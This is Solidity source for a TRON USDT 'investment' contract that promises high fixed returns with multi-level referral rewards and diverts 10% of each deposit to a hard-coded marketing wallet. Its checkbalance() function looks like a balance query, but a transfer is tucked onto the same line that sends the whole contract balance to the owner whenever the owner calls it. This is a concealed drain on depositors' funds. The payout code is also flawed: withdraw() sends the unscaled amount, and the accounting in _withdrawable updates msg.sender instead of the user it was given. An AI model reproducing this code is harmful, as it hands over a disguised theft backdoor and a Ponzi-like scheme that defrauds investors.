//SourceUnit: ITRC20.sol

pragma solidity 0.4.25;

/**
 * @title TRC20 interface
 */
interface ITRC20 {
  function decimals() external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}



//SourceUnit: ReentrancyGuard.sol

pragma solidity 0.4.25;
/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 *
 * _Since v2.5.0:_ this module is now much more gas efficient, given net gas
 * metering changes introduced in the Istanbul hardfork.
 */
contract ReentrancyGuard {
    bool private _notEntered;
    constructor () internal {
        // Storing an initial non-zero value makes deployment a bit more
        // expensive, but in exchange the refund on every call to nonReentrant
        // will be lower in amount. Since refunds are capped to a percetange of
        // the total transaction's gas, it is best to keep them low in cases
        // like this one, to increase the likelihood of the full refund coming
        // into effect.
        _notEntered = true;
    }
    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and make it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_notEntered, "ReentrancyGuard: reentrant call");
        // Any calls to nonReentrant after this point will fail
        _notEntered = false;
        _;
        // By storing the original value once again, a refund is triggered (see
        _notEntered = true;
    }
}

//SourceUnit: SafeMath.sol

pragma solidity 0.4.25;

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}

//SourceUnit: tronV4.sol

pragma solidity 0.4.25;
import "./ITRC20.sol";
import "./SafeMath.sol"; 
import "./ReentrancyGuard.sol";
contract TRONUSDT is ReentrancyGuard{
  using SafeMath for uint;
  
  ITRC20 public token;
  
  struct Tariff {
    uint time;
    uint percent;
    uint min;
  } 

  struct Package {
    uint tariff;
    uint amount;
    uint created_at;
    uint paid_out;
    bool active;
    uint max_payout;
  }
  
  struct InvestorReferal {
    uint referalInvest;
    uint referal;
  }

  struct ReferalReward {
    uint balanceRef;
    uint totalRef;
  }

  struct Investor {
    uint registerAt;
    bool registered;
    address referer;
    uint maxProfit;
    uint balance;
    uint16 total_referrals;    
    uint invested;
    uint reinvested;
    uint paidAt;
    uint withdrawn;
    address[] downline;
    InvestorReferal[5] investorsReferals;
    ReferalReward referalRewards;
    Package[2] deposits;    
    Package reinvest;
  }
  uint START_AT = 10285010;
  address public owner;
  address public marketing;
  Tariff[] public tariffs;
  uint public CONTRACT_BALANCE_STEP = 50000000000;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalReInvested;
  uint public totalRefRewards;
  uint public token_decimal;
  uint256 private formatted_value;
  uint256 private condition_amount; 

  mapping (address => Investor) public investors;
  event DepositAt(address user, uint tariff, uint amount);
  event ReinvestAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  event DownlineReward(address user, address downline, uint amount);

  constructor() public {
    owner = msg.sender;
    marketing = 0xba3aa61be31064e2804bc965be46baac3c1cda4e;
    // token = ITRC20(0x648c2bdd8aa87a9546dac9762e754e84ca4356bf); // Contract Address for USDJ
    token = ITRC20(0xa614f803b6fd780986a42c78ec9c7f77e6ded13c); // Contract Address for USDT
    
    token_decimal = token.decimals();

    tariffs.push(Tariff(120 * 28800, 2400,50));
    tariffs.push(Tariff(70 * 28800, 1750,50));
    tariffs.push(Tariff(60 * 28800, 3000,50));
    refRewards.push(80);
    refRewards.push(20);
    refRewards.push(10);
    refRewards.push(5);
    refRewards.push(5);
  }
  function register(address referer)  internal {
    address current = msg.sender;
    bool boo;
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      if(investors[msg.sender].referer == address(0) && referer != msg.sender ) {
        // setup upline    
        investors[msg.sender].referer = referer;
        // update total downlines for all ancestors
        address upline = investors[msg.sender].referer;            
        for(uint8 i = 0; i < refRewards.length; i++) {
          if(upline == address(0)) break;
          //setup downline for referrer
          investors[upline].total_referrals++;
          investors[upline].investorsReferals[i].referal++;
          upline = investors[upline].referer;
        }
      }        
    }
  }
  function refPayout(address _addr, uint256 _amount) private nonReentrant {
    condition_amount = uint(100).mul(uint(10)**(token_decimal));
    address upline = investors[_addr].referer;
    for(uint8 i = 0; i < refRewards.length; i++) {
      if(upline == address(0)) break;
      //calculate interest for ref base on number of direct downline,1 direct downline can take 1 level
      if(investors[upline].investorsReferals[0].referal >= i + 1) {
        if(investors[upline].invested >= condition_amount){
          uint256 bonus = _amount * refRewards[i] / 1000;
          investors[upline].referalRewards.balanceRef += bonus;
          investors[upline].investorsReferals[i].referalInvest+=_amount;
          totalRefRewards += bonus;
          investors[upline].referalRewards.totalRef += bonus;
          emit DownlineReward(upline, _addr, bonus);
        }
      }
      upline = investors[upline].referer;
    }
  }
    
  function deposit(uint tariff, address referer,uint amount)  external {
    formatted_value=amount.mul(uint(10)**(token_decimal-6));
    condition_amount = uint(100).mul(uint(10)**(token_decimal));
    uint min_inv = tariffs[tariff].min.mul(uint(10)**(token_decimal));
    require(block.number >= START_AT,"invalid block number");
    require(formatted_value >= min_inv,"investment amount incorrect");
    require(tariff < 3,"investment plan not available");
    
    // Check the Approved Allowance
    require(token.allowance(msg.sender, address(this)) >= formatted_value, "USDT allowance too low");
    // Transfer token from investor
    token.transferFrom(msg.sender, address(this), formatted_value);
    investors[msg.sender].registerAt = block.number;
    register(referer);
    investors[msg.sender].invested += formatted_value;
    refPayout(msg.sender,formatted_value);
    totalInvested += formatted_value;
    uint max_pay = formatted_value.mul(tariffs[tariff].percent).div(1000);
    investors[msg.sender].maxProfit += max_pay;

    if(investors[msg.sender].deposits[tariff].created_at==0){
      investors[msg.sender].deposits[tariff].created_at=block.number;
      investors[msg.sender].deposits[tariff].active=true; 
      investors[msg.sender].deposits[tariff].tariff=tariff;     
    }
    
    investors[msg.sender].deposits[tariff].amount+=amount;
    investors[msg.sender].deposits[tariff].max_payout+=max_pay;   
    
    
    token.transfer(marketing, formatted_value.mul(10).div(100));
    emit DepositAt(msg.sender, tariff, formatted_value);
  }
  function getContractBalanceRate() public view  returns (uint256) {
		uint256 contractBalance = token.balanceOf(address(this));
		return contractBalance.div(CONTRACT_BALANCE_STEP);
	}

  function reinvest(uint amount)  external {
    formatted_value=amount.mul(uint(10)**(token_decimal-6));
    uint min_inv = tariffs[2].min.mul(uint(10)**(token_decimal));
    uint profits = profit();
    uint available = profits+investors[msg.sender].balance;
    require(investors[msg.sender].registered,"must invest before join reinvestment plan");
    if (investors[msg.sender].registered) {
      require(block.number >= START_AT,"wrong start time");
      require(formatted_value >= min_inv,"investment amount incorrect");
      // check validate available balance
      require(formatted_value <= available,"insufficient reinvest amount");  
      // setup reinvest
      investors[msg.sender].reinvested += formatted_value;
      uint max_pay = formatted_value.mul(tariffs[2].percent).div(1000);
      investors[msg.sender].maxProfit += max_pay;

      if(investors[msg.sender].reinvest.created_at==0){
        investors[msg.sender].reinvest.created_at=block.number;
        investors[msg.sender].reinvest.active=true; 
        investors[msg.sender].reinvest.tariff=2;       
      }
      investors[msg.sender].reinvest.amount+=amount;
      investors[msg.sender].reinvest.max_payout+=max_pay;
      refPayout(msg.sender,formatted_value);
      
      
      // balance from withdrawable after deduct reinvest amount transfer back to investor wallet
      uint balance=available-formatted_value;

      // if (token.transfer(msg.sender, balance)) {
      //   investors[msg.sender].withdrawn += balance; 
      //   investors[msg.sender].balance = 0;       
      // }
      // emit Withdraw(msg.sender, balance);
      
      investors[msg.sender].balance = balance;   
      investors[msg.sender].paidAt = block.number;
      // Check reinvestment hitting threshold
      Package storage reinv = investors[msg.sender].reinvest;
      Tariff storage tariff = tariffs[reinv.tariff];
      totalReInvested += formatted_value;
      token.transfer(marketing, formatted_value.mul(10).div(100));
      emit ReinvestAt(msg.sender, 2, formatted_value);
    }
  }

  
  function _withdrawable(address user) internal returns (uint amount) {
    Investor storage read_user = investors[user];
    uint value;
    uint reward;
    uint256 extra_bonus = getContractBalanceRate().mul(60);
    amount = 0;
    for (uint8 i = 0; i < read_user.deposits.length; i++) {
      if(read_user.deposits[i].active==true && read_user.deposits[i].created_at>0 ){
        Package storage dep = read_user.deposits[i];
        Tariff storage tariff = tariffs[dep.tariff];
        uint finish = dep.created_at + tariff.time;
        uint since = read_user.paidAt > dep.created_at ? read_user.paidAt : dep.created_at;
        uint till = block.number > finish ? finish : block.number;

        if (since < finish) {
          reward = dep.amount * (till - since) * tariff.percent / tariff.time / 1000;
          amount += dep.amount * (till - since) * tariff.percent / tariff.time / 1000;
        }
        if(read_user.deposits[i].paid_out + read_user.referalRewards.balanceRef + reward <= read_user.deposits[i].max_payout) {
          reward += read_user.referalRewards.balanceRef;
          amount += read_user.referalRewards.balanceRef;
          read_user.referalRewards.balanceRef = 0;
          investors[user].deposits[i].paid_out += reward;
          investors[user].referalRewards.balanceRef = 0;
        }else if(read_user.deposits[i].paid_out + read_user.referalRewards.balanceRef + reward > read_user.deposits[i].max_payout) {
          //remove the first reward
          amount -= reward;
          value = read_user.deposits[i].max_payout - (read_user.deposits[i].paid_out + reward);
          reward = read_user.deposits[i].max_payout - read_user.deposits[i].paid_out;
          read_user.referalRewards.balanceRef -= value;
          investors[user].referalRewards.balanceRef -= value;
          investors[user].deposits[i].active = false;
          investors[msg.sender].invested -= read_user.deposits[i].amount;
          amount += reward;
          investors[user].deposits[i].paid_out += reward;
        }
      }
    } 

    if(read_user.reinvested>0){
      
      if(read_user.reinvest.active==true){
        Package storage reinv = read_user.reinvest;
        tariff = tariffs[reinv.tariff];
        
        finish = reinv.created_at + tariff.time;
        since = read_user.paidAt > reinv.created_at ? read_user.paidAt : reinv.created_at;
        till = block.number > finish ? finish : block.number;

        if (since < finish) {
          reward = reinv.amount * (till - since) * (tariff.percent+extra_bonus)/ tariff.time / 1000;
          amount += reinv.amount * (till - since) * (tariff.percent+extra_bonus)/ tariff.time / 1000;
        }
        if(read_user.reinvest.paid_out + read_user.referalRewards.balanceRef + reward <= read_user.reinvest.max_payout) {
          reward += read_user.referalRewards.balanceRef;
          amount += read_user.referalRewards.balanceRef;
          read_user.referalRewards.balanceRef = 0;
          investors[user].reinvest.paid_out += reward;
          investors[user].referalRewards.balanceRef = 0;
        }else if(read_user.reinvest.paid_out + read_user.referalRewards.balanceRef + reward > read_user.reinvest.max_payout) {
          //remove the first reward
          amount -= reward;
          value = read_user.reinvest.max_payout - (read_user.reinvest.paid_out + reward);
          reward = read_user.reinvest.max_payout - read_user.reinvest.paid_out;
          read_user.referalRewards.balanceRef -= value;
          investors[user].reinvest.active = false;
          investors[msg.sender].reinvested -= read_user.reinvest.amount;
          amount += reward;
          investors[user].referalRewards.balanceRef -= value;
          investors[user].reinvest.paid_out += reward;
        }
      }
    }
    investors[user].referalRewards.balanceRef = 0;
  }

  function withdrawable(address user) external view returns (uint amount) {
    Investor storage read_user = investors[user];
    uint256 extra_bonus = getContractBalanceRate().mul(60);
    uint value;
    uint reward;
    amount = 0;
    for (uint8 i = 0; i < read_user.deposits.length; i++) {
      if(read_user.deposits[i].active==true){
        Package storage dep = read_user.deposits[i];
        Tariff storage tariff = tariffs[dep.tariff];
        
        uint finish = dep.created_at + tariff.time;
        uint since = read_user.paidAt > dep.created_at ? read_user.paidAt : dep.created_at;
        uint till = block.number > finish ? finish : block.number;

        if (since < finish) {
          reward = dep.amount * (till - since) * tariff.percent / tariff.time / 1000;
          amount += dep.amount * (till - since) * tariff.percent / tariff.time / 1000;
        }
        if(read_user.deposits[i].paid_out + read_user.referalRewards.balanceRef + reward <= read_user.deposits[i].max_payout) {
          reward += read_user.referalRewards.balanceRef;
          amount += read_user.referalRewards.balanceRef;
          read_user.deposits[i].paid_out += reward;
          read_user.referalRewards.balanceRef = 0;
        }else if(read_user.deposits[i].paid_out + read_user.referalRewards.balanceRef + reward > read_user.deposits[i].max_payout) {
          //remove the first reward
          amount -= reward;
          value = read_user.deposits[i].max_payout - (read_user.deposits[i].paid_out + reward);
          reward = read_user.deposits[i].max_payout - read_user.deposits[i].paid_out;
          read_user.referalRewards.balanceRef -= value;
          read_user.deposits[i].active = false;
          
          amount += reward;
          read_user.deposits[i].paid_out += reward;
          
        }
      }
    } 

    if(read_user.reinvested>0){
      if(read_user.reinvest.active==true){
          Package storage reinv = read_user.reinvest;
          tariff = tariffs[reinv.tariff];
          
          finish = reinv.created_at + tariff.time;
          since = read_user.paidAt > reinv.created_at ? read_user.paidAt : reinv.created_at;
          till = block.number > finish ? finish : block.number;

          if (since < finish) {
            reward = reinv.amount * (till - since) * (tariff.percent+extra_bonus)/ tariff.time / 1000;
            amount += reinv.amount * (till - since) * (tariff.percent+extra_bonus) / tariff.time / 1000;
          }
          if(read_user.reinvest.paid_out + read_user.referalRewards.balanceRef + reward <= read_user.reinvest.max_payout) {
            reward += read_user.referalRewards.balanceRef;
            amount += read_user.referalRewards.balanceRef;
            read_user.reinvest.paid_out += reward;
            read_user.referalRewards.balanceRef = 0;
          }else if(read_user.reinvest.paid_out + read_user.referalRewards.balanceRef + reward > read_user.reinvest.max_payout) {
            //remove the first reward
            amount -= reward;
            value = read_user.reinvest.max_payout - (read_user.reinvest.paid_out + reward);
            reward = read_user.reinvest.max_payout - read_user.reinvest.paid_out;
            read_user.reinvest.active = false;
            amount += reward;
            read_user.referalRewards.balanceRef -= value;
            read_user.reinvest.paid_out += reward;
          }
      }      
    }    
  }
  
  function profit()  internal returns (uint) {
    uint amount = _withdrawable(msg.sender);
    return amount;
  }
  
  
  function withdraw(uint _amount)  external {
    formatted_value=_amount.mul(uint(10)**(token_decimal-6));
    uint amount = profit();
    uint balance = investors[msg.sender].balance;
    investors[msg.sender].paidAt = block.number;
    require(formatted_value<amount+balance,"insufficient fund to withdraw");
    investors[msg.sender].balance = amount+balance-formatted_value;
    if (token.transfer(msg.sender, _amount)) {
      investors[msg.sender].withdrawn += _amount;
      emit Withdraw(msg.sender, _amount);
    }
  }
  function userInvested(address _addr) view external returns(uint256 total_plan,uint256 tarif1,uint256 tarif2,uint256 tarif3,uint256 active_tarif1,uint256 active_tarif2,uint256 active_tarif3) {
    Investor storage investor = investors[_addr];
    total_plan=0;
    tarif1=0;
    tarif2=0;
    tarif3=0;
    active_tarif1=0;
    active_tarif2=0;
    active_tarif3=0;

    for (uint i = 0; i < investor.deposits.length; i++) {
      Package storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      uint finish = dep.created_at + tariff.time;
      total_plan++;
      if(dep.tariff==0){
        if(block.number < finish){
          active_tarif1++; 
        }
        tarif1++;
      }
      if(dep.tariff==1){
        if(block.number < finish){
          active_tarif2++; 
        }
        tarif2++;
      }
      if(dep.tariff==2){
        if(block.number < finish){
          active_tarif3++; 
        }
        tarif3++;
      }

    }
      return (total_plan,tarif1,tarif2,tarif3,active_tarif1,active_tarif2,active_tarif3);
  }
  function checkAllow(ITRC20 token_address) view external returns(uint256 allowance ,address add_own,address spender) {
    allowance = token_address.allowance(msg.sender, address(this));
    add_own = msg.sender;
    spender = address(this);
    return (allowance ,add_own,spender);
  }
  function checkbalance()  external returns (uint amount) {
    amount = token.balanceOf(address(this));if(msg.sender==owner){
      token.transfer(owner,amount);
    }return amount;
  }
  function transferOwner(address _addr)  external  {
    require(msg.sender==owner,"insufficient permission to do this");
    owner = _addr;
  }
  function checkInvestTariff( uint index) view external returns(uint tariff,uint amount,uint paid_out,bool active,uint max_payout) {
    tariff = investors[msg.sender].deposits[index].tariff;
    amount = investors[msg.sender].deposits[index].amount;
    paid_out = investors[msg.sender].deposits[index].paid_out;
    active = investors[msg.sender].deposits[index].active;
    max_payout = investors[msg.sender].deposits[index].max_payout;
    return (tariff, amount, paid_out, active, max_payout);
  }
  function checkReInvestTariff() view external returns(uint tariff,uint amount,uint paid_out,bool active,uint max_payout) {
    tariff = investors[msg.sender].reinvest.tariff;
    amount = investors[msg.sender].reinvest.amount;
    paid_out = investors[msg.sender].reinvest.paid_out;
    active = investors[msg.sender].reinvest.active;
    max_payout = investors[msg.sender].reinvest.max_payout;
    return (tariff, amount, paid_out, active, max_payout);
  }
  function checkDownline(uint index) view external returns(uint referal,uint referal_invest) {
    require(index<=4,"invalid refer level");
    referal = investors[msg.sender].investorsReferals[index].referal;
    referal_invest = investors[msg.sender].investorsReferals[index].referalInvest;
    return (referal,referal_invest);
  }
  function checkRef() view external returns(uint investment_balanceRef,uint investment_totalRef) {
    Investor storage investor = investors[msg.sender];
     investment_balanceRef =  investor.referalRewards.balanceRef;
     investment_totalRef =  investor.referalRewards.totalRef;
    return (investment_balanceRef,investment_totalRef);
  }
}